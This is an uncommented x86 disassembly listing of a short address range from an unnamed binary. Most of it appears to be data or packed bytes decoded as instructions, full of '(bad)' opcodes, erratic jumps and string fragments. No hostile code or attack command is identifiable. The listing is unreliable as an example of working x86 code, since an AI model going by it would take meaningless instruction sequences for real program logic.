  4340e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4340e4:	rol    DWORD PTR [ecx],0x84
  4340e7:	add    BYTE PTR [ecx],al
  4340e9:	cmp    BYTE PTR [eax],al
  4340eb:	pushf  
  4340ec:	inc    ebp
  4340ed:	jnp    0x8a4374f0
  4340f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4340f9:	lock dec ebp
  4340fb:	retf   
  4340fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4340ff:	mov    eax,eax
  434101:	fmul   st,st(3)
  434103:	test   ecx,0x1998484
  434109:	xor    al,BYTE PTR [eax]
  43410b:	mov    DWORD PTR [ebp-0x28],eax
  43410e:	mov    eax,DWORD PTR [ebp+0x33]
  434111:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434117:	ret    
  434118:	add    al,cl
  43411a:	dec    ebp
  43411b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434121:	add    ecx,DWORD PTR ds:0xc7250
  434127:	inc    ebp
  434128:	rcl    DWORD PTR [eax+0x4d],0x2b
  43412c:	mov    edi,edi
  43412e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434134:	jb     0x4340fd
  434136:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43413d:	mov    esi,DWORD PTR [ebx]
  43413f:	cld    
  434140:	mov    cl,bh
  434142:	or     eax,0x372b6
  434147:	cmp    ecx,eax
  434149:	jne    0x4341c6
  43414f:	mov    eax,DWORD PTR [ebp-0x20]
  434152:	mov    eax,DWORD PTR [eax]
  434154:	xor    eax,edi
  434156:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43415d:	mov    ecx,DWORD PTR [ebp-0x4]
  434160:	mov    ecx,edi
  434162:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434168:	jb     0x434179
  43416a:	add    BYTE PTR [edi-0x3f],dl
  43416d:	add    BYTE PTR [ebp-0x75],cl
  434170:	mov    esi,eax
  434172:	xor    eax,DWORD PTR [eax]
  434174:	mov    al,bh
  434176:	or     eax,0x497284
  43417b:	xor    al,cl
  43417d:	mov    ecx,DWORD PTR [ebp-0x4]
  434180:	mov    ecx,edi
  434182:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434188:	jb     0x434199
  43418a:	add    BYTE PTR [edi],dh
  43418c:	enter  0x8500,0x8b
  434190:	add    ah,bl
  434192:	add    BYTE PTR [eax],al
  434194:	inc    ebp
  434195:	(bad)  
  434196:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43419d:	mov    esi,DWORD PTR [edx-0x4]
  4341a0:	add    bh,cl
  4341a2:	dec    ebp
  4341a3:	mov    dh,0x8b
  4341a5:	add    esi,DWORD PTR [ebx]
  4341a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4341ad:	add    BYTE PTR [eax],al
  4341af:	mov    eax,ecx
  4341b1:	loopne 0x434200
  4341b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4341b9:	dec    ecx
  4341ba:	or     eax,0x8b7232
  4341bf:	in     al,0xc1
  4341c1:	or     DWORD PTR [ebp-0x31],ecx
  4341c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4341cb:	xor    dh,BYTE PTR [edx-0x75]
  4341ce:	add    al,dh
  4341d0:	enter  0x4f09,0xcf
  4341d4:	inc    ebp
  4341d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4341db:	or     al,BYTE PTR ds:0xe4728b
  4341e1:	or     DWORD PTR [ebp-0x31],ecx
  4341e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4341eb:	cmp    dh,BYTE PTR [edx+0xf]
  4341ee:	add    bl,dl
  4341f0:	rol    DWORD PTR [eax],0x4d
  4341f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4341f9:	(bad)  
  4341fa:	or     eax,0x497284
  4341ff:	xor    al,cl
  434201:	mov    ecx,DWORD PTR [ebp-0x20]
  434204:	mov    ecx,DWORD PTR [ecx]
  434206:	xor    ecx,edi
  434208:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43420f:	xor    cl,al
  434211:	mov    ecx,DWORD PTR [edi]
  434213:	fadd   QWORD PTR [ebp+0x9]
  434216:	call   0xffd03cea
  43421b:	dec    ecx
  43421c:	dec    ebp
  43421d:	xor    bh,BYTE PTR [ebx]
  43421f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434223:	loopne 0x434221
  434225:	or     edi,eax
  434227:	iret   
  434228:	ret    
  434229:	mov    WORD PTR [ebp+0x4d],es
  43422c:	mov    esi,DWORD PTR [edx]
  43422e:	call   0x8453096d
  434233:	(bad)  
  434234:	cdq    
  434235:	add    BYTE PTR [edx],dh
  434237:	mov    esi,DWORD PTR [ebx]
  434239:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43423f:	test   BYTE PTR [ebx],dh
  434241:	dec    ecx
  434242:	add    esi,DWORD PTR [edx]
  434244:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43424a:	dec    edi
  43424c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434253:	xor    al,BYTE PTR [ebx]
  434255:	mov    edi,DWORD PTR [ebx]
  434257:	in     al,0x75
  434259:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43425f:	dec    ecx
  434260:	xor    esi,DWORD PTR [edx]
  434262:	lea    ecx,[edx]
  434264:	or     BYTE PTR [ebx+0x900f072],cl
  43426a:	ja     0x43423b
  43426c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434273:	cmp    ch,al
  434275:	jne    0x43426a
  434277:	mov    edi,edi
  434279:	fadd   QWORD PTR [ebp+0x0]
  43427c:	mov    eax,edi
  43427e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434285:	mov    edx,DWORD PTR [ebx]
  434287:	in     al,0x45
  434289:	or     DWORD PTR [ebx],esi
  43428b:	iret   
  43428c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434293:	xor    dl,BYTE PTR [eax-0x75]
  434296:	sbb    al,0xe0
  434298:	dec    DWORD PTR [ecx]
  43429a:	mov    ecx,edi
  43429c:	in     al,dx
  43429d:	mov    eax,es
  43429f:	dec    ecx
  4342a0:	mov    DWORD PTR [edx],esi
  4342a2:	fmul   QWORD PTR [edx]
  4342a4:	jne    0x434231
  4342a6:	(bad)  
  4342a7:	(bad)  
  4342a9:	or     DWORD PTR [ebp-0x31],eax
  4342ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4342b3:	cmp    bh,bh
  4342b5:	jne    0x4342fc
  4342b7:	lea    ecx,[ebx-0x38372750]
  4342bd:	inc    ebx
  4342bf:	mov    eax,ecx
  4342c1:	mov    eax,0xa00c111
  4342c6:	jne    0x43430d
  4342c8:	mov    esi,DWORD PTR [ebx]
  4342ca:	test   al,0x3
  4342cc:	inc    ebp
  4342cd:	mov    DWORD PTR [eax-0xc],edx
  4342d0:	loop   0x434317
  4342d2:	push   DWORD PTR [ebx]
  4342d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4342da:	add    DWORD PTR [eax],eax
  4342dc:	mov    eax,edi
  4342de:	lods   al,BYTE PTR ds:[esi]
  4342df:	dec    ebp
  4342e0:	inc    ebp
  4342e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4342e7:	retf   
  4342e8:	mov    edx,ecx
  4342ea:	adc    al,0x84
  4342ec:	(bad)  
  4342ed:	std    
  4342ee:	ret    
  4342ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4342f5:	hlt    
  4342f6:	rol    edi,0x82
  4342f9:	ret    
  4342fa:	cld    
  4342fb:	enter  0x11ff,0x45
  4342ff:	inc    ebp
  434300:	pop    edi
  434301:	mov    ebx,DWORD PTR [ebx+0x14]
  434304:	ret    0xc7
  434307:	test   BYTE PTR [ebx+0x45325199],cl
  43430d:	jmp    0x43429a
  43430f:	push   0x8
  434311:	call   DWORD PTR [esi]
  434313:	in     al,dx
  434314:	add    BYTE PTR [ebp+0x1],0x50
  434318:	add    bh,ah
  43431a:	add    bh,bh
  43431c:	icebp  
  43431d:	mov    ecx,DWORD PTR [eax]
  43431f:	cld    
  434320:	pop    es
  434321:	dec    ebp
  434322:	shl    DWORD PTR [ebx],0x72
  434325:	add    eax,DWORD PTR [eax]
  434327:	cmp    edx,ecx
  434329:	je     0x43433b
  43432b:	mov    esi,DWORD PTR [ebp-0x4]
  43432e:	inc    edi
  434330:	or     al,0xc3
  434332:	jmp    FWORD PTR [edx-0x18]
  434335:	(bad)  
  434336:	sti    
  434337:	cwde   
  434338:	(bad)  
  434339:	call   0xffa13c44
  43433e:	or     al,0x45
  434340:	push   ebp
  434341:	sub    esp,0x18
  434344:	push   ebx
  434345:	inc    ebp
  434346:	mov    edi,edi
  434348:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43434f:	test   al,0x51
  434351:	inc    ebp
  434352:	push   ecx
  434353:	push   eax
  434354:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43435a:	add    ah,bh
  43435c:	(bad)  
  43435d:	dec    ebp
  43435e:	add    DWORD PTR [ebx],esi
  434360:	inc    ebp
  434361:	add    ecx,DWORD PTR [ebx+0x74943b]
  434367:	push   0xffffff8b
  434369:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43436f:	add    eax,DWORD PTR [ecx]
  434371:	or     BYTE PTR [eax],al
  434373:	call   0xff853b78
  434378:	mov    eax,DWORD PTR [ebp+0x14]
  43437b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434381:	inc    ebp
  434382:	dec    ecx
  434383:	add    ebp,DWORD PTR [edx+0x14]
  434386:	push   0x8b3045
  43438b:	call   0x33ad9100
  434390:	inc    DWORD PTR [ebx]
  434392:	mov    DWORD PTR [edi],ecx
  434394:	mov    eax,ecx
  434396:	or     BYTE PTR [ebp-0x3d],cl
  434399:	cmp    eax,edi
  43439b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4343a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4343a6:	adc    al,0xc9
  4343a8:	inc    ebp
  4343a9:	adc    BYTE PTR [eax+0x55],dl
  4343ac:	jne    0x43439a
  4343ae:	call   0xff54433e
  4343b3:	dec    ebp
  4343b4:	inc    ebp
  4343b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4343bb:	add    BYTE PTR [ebx],bh
  4343bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4343c1:	push   ecx
  4343c2:	or     al,0x51
  4343c4:	dec    ebp
  4343c5:	xor    DWORD PTR [ebx],0xf320399
  4343cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4343ce:	mov    edi,edi
  4343d0:	pop    edi
  4343d1:	adc    BYTE PTR [ebx+0x75],bl
  4343d4:	ret    0x50
  4343d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4343db:	(bad)  
  4343dc:	clc    
  4343dd:	mov    esp,ebp
  4343df:	pop    ecx
  4343e0:	mov    ecx,0xf80085c2
  4343e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4343e8:	push   esi
  4343e9:	push   esi
  4343ea:	(bad)  
  4343eb:	lock add eax,DWORD PTR [ebp+0x44]
  4343ef:	mov    edx,DWORD PTR [eax]
  4343f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4343f5:	or     BYTE PTR [ecx+0x7],dl
  4343f8:	push   ecx
  4343f9:	ret    
  4343fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434400:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434406:	or     al,0x80
  434408:	jge    0x43440b
  43440a:	mov    DWORD PTR [eax],eax
  43440c:	and    al,0x8
  43440e:	cmp    DWORD PTR [ebp+0x10],eax
  434411:	mov    edx,DWORD PTR [esi]
  434413:	xchg   esp,eax
  434414:	dec    esp
  434415:	add    BYTE PTR [eax],dl
  434417:	mov    ecx,edx
  434419:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43441d:	dec    ebp
  43441e:	into   
  43441f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434425:	mov    edx,DWORD PTR [eax+0x14]
  434428:	das    
  434429:	add    al,0x45
  43442b:	add    BYTE PTR [ebp+0x0],dh
  43442e:	mov    edi,edi
  434430:	and    al,0x50
  434432:	mov    eax,DWORD PTR [eax]
  434434:	and    al,0xd1
  434436:	xor    eax,DWORD PTR [esi]
  434438:	lea    eax,[ebp+0x8]
  43443b:	xor    esi,DWORD PTR [edx+0x3]
  43443e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434444:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43444a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434454:	cmp    edi,edi
  434456:	pushf  
  434457:	mov    edi,edi
  434459:	or     BYTE PTR [esi+ecx*1],cl
  43445c:	jne    0x434421
  43445e:	call   0xc442a
  434463:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434467:	mov    ebx,DWORD PTR [eax]
  434469:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43446d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434475:	pop    esi
  434476:	(bad)  
  434477:	leave  
  434478:	call   DWORD PTR [eax]
  43447a:	call   DWORD PTR [ebp+0x24]
  43447d:	in     al,dx
  43447e:	jmp    esp
  434480:	and    al,0x83
  434482:	call   0xff7a4297
  434487:	pushf  
  434488:	inc    esp
  434489:	mov    DWORD PTR [esp],ecx
  43448c:	pop    esi
  43448d:	push   edi
  43448e:	in     eax,0x41
  434490:	ret    0x89
  434493:	and    al,0xe
  434495:	mov    edi,DWORD PTR [eax]
  434497:	and    al,0x75
  434499:	mov    edx,0x7750885
  43449e:	or     dl,bh
  4344a0:	call   FWORD PTR [ecx+0x3243224]
  4344a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4344ac:	dec    DWORD PTR [esp]
  4344af:	jl     0x43443c
  4344b1:	adc    al,0xc
  4344b3:	dec    ebp
  4344b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4344b7:	mov    ecx,DWORD PTR [eax]
  4344b9:	and    al,0x10
  4344bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4344c2:	test   DWORD PTR [edi],ecx
  4344c4:	jge    0x434490
  4344c6:	push   0x8908ff4c
  4344cb:	jmp    0x4344f1
  4344cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4344d1:	dec    esp
  4344d2:	pop    ebp
  4344d3:	ret    0x8999
  4344d6:	push   0x74f89cf8
  4344db:	jmp    0x434551
  4344dd:	mov    edi,0x104fd55f
  4344e2:	add    BYTE PTR [eax],dh
  4344e4:	adc    BYTE PTR ds:[eax],al
  4344e7:	or     edx,DWORD PTR gs:[eax]
  4344ea:	add    BYTE PTR [ecx],ch
  4344ec:	add    eax,0x35270010
  4344f1:	adc    BYTE PTR [eax],al
  4344f3:	std    
  4344f4:	dec    eax
  4344f5:	adc    BYTE PTR [eax],al
  4344f7:	(bad)  
  4344f8:	outs   dx,BYTE PTR ds:[esi]
  4344f9:	adc    BYTE PTR [eax],al
  4344fb:	sahf   
  4344fc:	xor    DWORD PTR [eax],edx
  4344fe:	add    BYTE PTR [esi+0x0],al
  434501:	adc    BYTE PTR [eax],al
  434503:	fs jae 0x434516
  434506:	add    BYTE PTR [ebx-0x20ffefac],bh
  43450c:	inc    esp
  43450d:	inc    ebx
  43450e:	add    bl,ah
  434510:	inc    esp
  434511:	inc    ebx
  434512:	add    bh,ah
  434514:	inc    esp
  434515:	inc    ebx
  434516:	add    bl,ch
  434518:	inc    esp
  434519:	inc    ebx
  43451a:	add    bh,ch
  43451c:	inc    esp
  43451d:	inc    ebx
  43451e:	add    bl,dh
  434520:	inc    esp
  434521:	inc    ebx
  434522:	add    bh,dh
  434524:	inc    esp
  434525:	inc    ebx
  434526:	add    bl,bh
  434528:	inc    esp
  434529:	inc    ebx
  43452a:	add    bh,bh
  43452c:	inc    esp
  43452d:	inc    ebx
  43452e:	add    BYTE PTR [ebx],al
  434530:	inc    ebp
  434531:	inc    ebx
  434532:	add    BYTE PTR [edi],al
  434534:	inc    ebp
  434535:	inc    ebx
  434536:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43453d:	adc    BYTE PTR [eax],al
  43453f:	adc    dh,BYTE PTR [ecx+0x10]
  434542:	add    BYTE PTR [edi+0x2c001065],al
  434548:	push   0x5aa20010
  43454d:	adc    BYTE PTR [eax],al
  43454f:	rol    DWORD PTR [eax+edx*1],0x0
  434553:	int    0x6f
  434555:	adc    BYTE PTR [eax],al
  434557:	aaa    
  434558:	inc    ebp
  434559:	inc    ebx
  43455a:	add    BYTE PTR [ebx],bh
  43455c:	inc    ebp
  43455d:	inc    ebx
  43455e:	add    BYTE PTR [edi],bh
  434560:	inc    ebp
  434561:	inc    ebx
  434562:	add    BYTE PTR [ebx+0x45],al
  434565:	inc    ebx
  434566:	add    BYTE PTR [edi+0x45],al
  434569:	inc    ebx
  43456a:	add    BYTE PTR [ebx+0x45],cl
  43456d:	inc    ebx
  43456e:	add    BYTE PTR [edi+0x45],cl
  434571:	inc    ebx
  434572:	add    BYTE PTR [ebx+0x45],dl
  434575:	inc    ebx
  434576:	add    BYTE PTR [ebx+0x54001005],dh
  43457c:	push   ebp
  43457d:	adc    BYTE PTR [eax],al
  43457f:	sbb    bh,BYTE PTR [eax]
  434581:	adc    BYTE PTR [eax],al
  434583:	mov    edx,0x2f001013
  434588:	dec    edx
  434589:	adc    BYTE PTR [eax],al
  43458b:	inc    ecx
  43458c:	or     edx,DWORD PTR [eax]
  43458e:	add    BYTE PTR [ebx+0x19],ch
  434591:	adc    BYTE PTR [eax],al
  434593:	mov    esp,0x7700103e
  434598:	inc    ebp
  434599:	inc    ebx
  43459a:	add    BYTE PTR [ebx+0x45],bh
  43459d:	inc    ebx
  43459e:	add    BYTE PTR [edi+0x45],bh
  4345a1:	inc    ebx
  4345a2:	add    BYTE PTR [ebx-0x78ffbcbb],al
  4345a8:	inc    ebp
  4345a9:	inc    ebx
  4345aa:	add    BYTE PTR [ebx-0x70ffbcbb],cl
  4345b0:	inc    ebp
  4345b1:	inc    ebx
  4345b2:	add    BYTE PTR [ebx-0x50ffbcbb],dl
  4345b8:	push   0x10
  4345ba:	add    al,bl
  4345bc:	imul   edx,DWORD PTR [eax],0x0
  4345bf:	sahf   
  4345c0:	push   ss
  4345c1:	adc    BYTE PTR [eax],al
  4345c3:	jle    0x4345ff
  4345c5:	adc    BYTE PTR [eax],al
  4345c7:	jbe    0x4345de
  4345c9:	adc    BYTE PTR [eax],al
  4345cb:	cmp    DWORD PTR [edi+0x10],edx
  4345ce:	add    BYTE PTR [ebp+0x59001066],bl
  4345d4:	adc    al,0x10
  4345d6:	add    BYTE PTR [edi-0x44ffbcbb],dh
  4345dc:	inc    ebp
  4345dd:	inc    ebx
  4345de:	add    BYTE PTR [edi-0x3cffbcbb],bh
  4345e4:	inc    ebp
  4345e5:	inc    ebx
  4345e6:	add    bh,al
  4345e8:	inc    ebp
  4345e9:	inc    ebx
  4345ea:	add    bl,cl
  4345ec:	inc    ebp
  4345ed:	inc    ebx
  4345ee:	add    bh,cl
  4345f0:	inc    ebp
  4345f1:	inc    ebx
  4345f2:	add    bl,dl
  4345f4:	inc    ebp
  4345f5:	inc    ebx
  4345f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4345fc:	inc    ebp
  4345fd:	adc    BYTE PTR [eax],al
  4345ff:	dec    ebx
  434600:	dec    eax
  434601:	adc    BYTE PTR [eax],al
  434603:	dec    ebx
  434604:	popa   
  434605:	adc    BYTE PTR [eax],al
  434607:	adc    al,BYTE PTR [eax+edx*1]
  43460a:	add    dh,dl
  43460c:	push   ds
  43460d:	adc    BYTE PTR [eax],al
  43460f:	hlt    
  434610:	pop    ds
  434611:	adc    BYTE PTR [eax],al
  434613:	dec    ecx
  434614:	pop    eax
  434615:	adc    BYTE PTR [eax],al
  434617:	test   DWORD PTR [ebp+0x43],0x4345fb00
  43461e:	add    bh,bh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    BYTE PTR [ebx],al
  434624:	inc    esi
  434625:	inc    ebx
  434626:	add    BYTE PTR [edi],al
  434628:	inc    esi
  434629:	inc    ebx
  43462a:	add    BYTE PTR [ebx],cl
  43462c:	inc    esi
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [edi],cl
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [ebx],dl
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [ebp+0x57],cl
  434639:	xor    DWORD PTR [ecx],esi
  43463b:	cmp    BYTE PTR [edi+ebx*2],dh
  43463e:	push   ecx
  43463f:	add    BYTE PTR [edx+0x33],dl
  434642:	push   esi
  434643:	xor    eax,0x3849515f
  434648:	xor    al,0x59
  43464a:	push   edi
  43464b:	add    BYTE PTR [ebx+0x54],al
  43464e:	inc    ebp
  43464f:	pop    edi
  434650:	dec    ebx
  434651:	push   edx
  434652:	push   ebp
  434653:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434658:	pop    edi
  434659:	aaa    
  43465a:	xor    al,0x32
  43465c:	xor    BYTE PTR [edi+0x5f],al
  43465f:	inc    ebx
  434660:	pop    edx
  434661:	add    BYTE PTR [edi+0x4e],al
  434664:	cmp    DWORD PTR [edi+0x47],ebx
  434667:	push   ebx
  434668:	cmp    DWORD PTR [edi+0x4e],edx
  43466b:	add    BYTE PTR [ecx+0x44],dl
  43466e:	cmp    BYTE PTR [edi+0x33],bl
  434671:	cmp    BYTE PTR [eax],dh
  434673:	pop    edi
  434674:	inc    ecx
  434675:	dec    edi
  434676:	inc    esi
  434677:	push   eax
  434678:	add    BYTE PTR [edx+0x43],dl
  43467b:	xor    eax,0x41305f30
  434680:	xor    BYTE PTR [esi+0x5f],al
  434683:	inc    ebx
  434684:	xor    dh,BYTE PTR [edx]
  434686:	xor    eax,0x36545200
  43468b:	xor    al,0x5f
  43468d:	dec    esi
  43468e:	xor    esi,DWORD PTR [edx]
  434690:	add    BYTE PTR ss:[eax+0x4b],cl
  434694:	inc    ebx
  434695:	pop    edi
  434696:	ss xor al,0x34
  434699:	pop    edi
  43469a:	inc    ecx
  43469b:	push   esp
  43469c:	dec    edi
  43469d:	add    BYTE PTR [esi+0x52],dl
  4346a0:	push   esi
  4346a1:	pop    edi
  4346a2:	inc    esi
  4346a3:	push   ecx
  4346a4:	push   ebp
  4346a5:	push   edx
  4346a6:	dec    eax
  4346a7:	add    BYTE PTR [esi+0x41],cl
  4346aa:	inc    edx
  4346ab:	pop    edi
  4346ac:	xor    DWORD PTR [ecx],edi
  4346ae:	push   edi
  4346af:	pop    edi
  4346b0:	pop    edx
  4346b1:	xor    eax,0x47003934
  4346b6:	push   edx
  4346b7:	push   ebp
  4346b8:	pop    edi
  4346b9:	xor    al,BYTE PTR [edx+0x30]
  4346bc:	push   ebx
  4346bd:	dec    esi
  4346be:	xor    eax,0x38564300
  4346c3:	xor    al,0x5f
  4346c5:	xor    bl,BYTE PTR [eax+0x36]
  4346c8:	inc    edx
  4346c9:	pop    edi
  4346ca:	pop    ecx
  4346cb:	xor    al,BYTE PTR [ecx+0x0]
  4346ce:	push   edi
  4346cf:	dec    ecx
  4346d0:	push   ebx
  4346d1:	xor    DWORD PTR [eax],edi
  4346d3:	pop    edi
  4346d4:	push   ecx
  4346d5:	xor    BYTE PTR [edx+0x5f],cl
  4346d8:	inc    ecx
  4346d9:	add    BYTE PTR ss:[edx+0x45],al
  4346dd:	push   edi
  4346de:	cmp    DWORD PTR [eax],edi
  4346e0:	pop    edi
  4346e1:	inc    edx
  4346e2:	xor    eax,0x36520057
  4346e7:	aaa    
  4346e8:	xor    BYTE PTR [edi],dh
  4346ea:	pop    edi
  4346eb:	inc    edx
  4346ec:	cmp    DWORD PTR [edi+0x52],eax
  4346ef:	dec    esp
  4346f0:	pop    edi
  4346f1:	dec    ebx
  4346f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4346f6:	pop    edi
  4346f7:	push   ebp
  4346f8:	push   ebx
  4346f9:	aaa    
  4346fa:	dec    ebp
  4346fb:	pop    edi
  4346fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4346ff:	dec    ebx
  434700:	dec    edx
  434701:	add    BYTE PTR [edi+0x47],al
  434704:	xor    eax,0x534e5f32
  434709:	push   esp
  43470a:	pop    edi
  43470b:	push   esp
  43470c:	inc    edx
  43470d:	inc    esi
  43470e:	inc    esp
  43470f:	add    BYTE PTR [ebp+0x4e],al
  434712:	inc    edi
  434713:	cmp    DWORD PTR [edi+0x57],ebx
  434716:	push   eax
  434717:	push   ecx
  434718:	pop    edi
  434719:	dec    edi
  43471a:	inc    ebx
  43471b:	push   edi
  43471c:	pop    edi
  43471d:	inc    edi
  43471e:	add    BYTE PTR [edi+0x45],dl
  434721:	inc    esi
  434722:	pop    edi
  434723:	push   edx
  434724:	inc    edx
  434725:	pop    eax
  434726:	inc    edi
  434727:	ss pop edi
  434729:	push   esi
  43472a:	inc    ebx
  43472b:	dec    esi
  43472c:	inc    esp
  43472d:	add    BYTE PTR [edi+0x4d],cl
  434730:	inc    edi
  434731:	xor    ebx,DWORD PTR [edi+0x34]
  434734:	dec    esi
  434735:	pop    edx
  434736:	cmp    BYTE PTR [edi+0x58],bl
  434739:	cmp    BYTE PTR [eax],al
  43473b:	push   edx
  43473c:	pop    eax
  43473d:	push   ecx
  43473e:	pop    edi
  43473f:	dec    esp
  434740:	push   edx
  434741:	dec    ecx
  434742:	dec    edi
  434743:	inc    esp
  434744:	pop    edi
  434745:	dec    edi
  434746:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43474a:	push   eax
  43474b:	inc    ebp
  43474c:	pop    edi
  43474d:	xor    eax,0x565f3945
  434752:	add    BYTE PTR [edi+0x4e],al
  434755:	push   esi
  434756:	pop    edi
  434757:	inc    edi
  434758:	push   esp
  434759:	dec    eax
  43475a:	xor    dh,BYTE PTR [ecx]
  43475c:	pop    edi
  43475d:	dec    edi
  43475e:	xor    eax,DWORD PTR ss:[eax]
  434761:	inc    esp
  434762:	inc    ebp
  434763:	dec    ecx
  434764:	pop    edi
  434765:	push   edx
  434766:	dec    eax
  434767:	xor    al,0x48
  434769:	dec    ecx
  43476a:	ss pop edi
  43476c:	aaa    
  43476d:	aaa    
  43476e:	dec    ecx
  43476f:	dec    ebp
  434770:	add    BYTE PTR [eax+0x54],cl
  434773:	ss pop edi
  434775:	inc    esi
  434776:	inc    edx
  434777:	xor    dh,BYTE PTR [eax+eax*1]
  43477a:	dec    esi
  43477b:	ss dec edx
  43477d:	pop    edi
  43477e:	dec    ecx
  43477f:	dec    esp
  434780:	inc    edi
  434781:	inc    esp
  434782:	dec    eax
  434783:	xor    BYTE PTR [eax],bh
  434785:	xor    eax,0x34004f00
  43478a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43478e:	add    BYTE PTR [edi],dh
  434790:	add    BYTE PTR [eax],dh
  434792:	add    BYTE PTR [edi+0x0],bl
  434795:	inc    esp
  434796:	add    BYTE PTR [edi+0x0],al
  434799:	dec    ebx
  43479a:	add    BYTE PTR [edx],dh
  43479c:	add    BYTE PTR [ecx+0x0],al
  43479f:	inc    ebx
  4347a0:	add    BYTE PTR [eax],al
  4347a2:	add    BYTE PTR [edi+0x0],cl
  4347a5:	xor    al,BYTE PTR [eax]
  4347a7:	xor    eax,DWORD PTR [eax]
  4347a9:	pop    edi
  4347aa:	add    BYTE PTR [edi+0x0],dl
  4347ad:	xor    al,BYTE PTR [eax]
  4347af:	dec    edi
  4347b0:	add    BYTE PTR [edi+0x0],bl
  4347b3:	pop    edx
  4347b4:	add    BYTE PTR [eax],al
  4347b6:	add    BYTE PTR [eax+0x0],bl
  4347b9:	dec    esp
  4347ba:	add    BYTE PTR [ecx],bh
  4347bc:	add    BYTE PTR [edi+0x0],bl
  4347bf:	dec    ebx
  4347c0:	add    BYTE PTR [ecx+0x0],al
  4347c3:	dec    edx
  4347c4:	add    BYTE PTR [esi+0x0],al
  4347c7:	xor    DWORD PTR [eax],eax
  4347c9:	xor    al,0x0
  4347cb:	pop    edi
  4347cc:	add    BYTE PTR [eax+0x0],bl
  4347cf:	inc    edi
  4347d0:	add    BYTE PTR [edx+0x0],al
  4347d3:	add    BYTE PTR [eax],al
  4347d5:	push   eax
  4347d6:	add    BYTE PTR [ebx],dh
  4347d8:	add    BYTE PTR [esi+0x0],cl
  4347db:	pop    edi
  4347dc:	add    BYTE PTR [eax+0x0],cl
  4347df:	xor    eax,0x5f005300
  4347e4:	add    BYTE PTR [eax+0x0],cl
  4347e7:	add    BYTE PTR [eax],al
  4347e9:	dec    ebp
  4347ea:	add    BYTE PTR [eax],dh
  4347ec:	add    BYTE PTR [edx+0x0],al
  4347ef:	pop    edi
  4347f0:	add    BYTE PTR [edx+0x0],cl
  4347f3:	pop    eax
  4347f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4347f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4347fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434800:	add    BYTE PTR [ecx+0x0],al
  434803:	xor    eax,DWORD PTR [eax]
  434805:	xor    BYTE PTR [eax],al
  434807:	pop    edi
  434808:	add    BYTE PTR [ecx+0x0],al
  43480b:	pop    edx
  43480c:	add    BYTE PTR [ecx+0x0],dl
  43480f:	pop    edx
  434810:	add    BYTE PTR [ecx],bh
  434812:	add    BYTE PTR [esi],dh
  434814:	add    BYTE PTR [edi+0x0],bl
  434817:	dec    eax
